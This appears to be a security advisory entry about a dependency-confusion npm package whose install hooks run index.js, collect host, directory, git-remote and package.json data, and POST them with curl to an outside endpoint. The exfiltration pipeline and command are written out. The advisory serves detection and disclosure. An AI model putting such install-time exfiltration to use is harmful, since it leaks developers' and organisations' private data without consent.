summary: Dependency-confusion package exfiltrates host and repo data on install to https://o5i.cc/supp
details: @stockrepublic/republic-components@100.0.0 declares both `preinstall` and `install` lifecycle hooks as `node index.js`. index.js calls `child_process.execSync` to run a shell pipeline that collects `id`, `ls -la src/`, `hostname`, `git config --get remote.origin.url`, and the contents of `package.json` into `log.txt`, then POSTs the file to `https://o5i.cc/supp` via `curl -X POST -F file=@log.txt`. The package's stated purpose ('Runs git diff and saves the output to git.log on install') does not match the actual behavior. The combination of a scoped name targeting an apparently-private `@stockrepublic` namespace, an inflated `100.0.0` version, placeholder author metadata, and a cover-story description fits the dependency-confusion attack template: any internal build that resolves `@stockrepublic/republic-components` from the public registry will run this exfiltration on `npm install` with zero user consent, leaking host identity, source-tree layout, and the private git remote URL to an attacker-controlled endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
